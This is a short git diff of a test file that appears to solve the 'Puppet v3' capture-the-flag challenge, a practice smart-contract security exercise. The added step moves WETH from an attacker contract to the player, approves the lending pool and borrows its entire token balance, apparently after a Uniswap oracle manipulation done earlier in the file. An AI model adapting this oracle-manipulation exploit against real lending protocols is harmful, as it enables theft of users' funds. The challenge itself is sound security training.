@@ -279,6 +279,17 @@ describe("[Challenge] Puppet v3", function () {
       "current slot0 tick ",
       (await uniswapPool.slot0())[1].toString()
     );
+
+    /**Step 3: Transfer Weth from attacker contract to player and borrow from pool */
+    await puppetV3Attacker.connect(player).transferWeth();
+
+    await weth
+      .connect(player)
+      .approve(lendingPool.address, ethers.utils.parseEther("99"));
+
+    await lendingPool
+      .connect(player)
+      .borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
   });
 
   after(async function () {
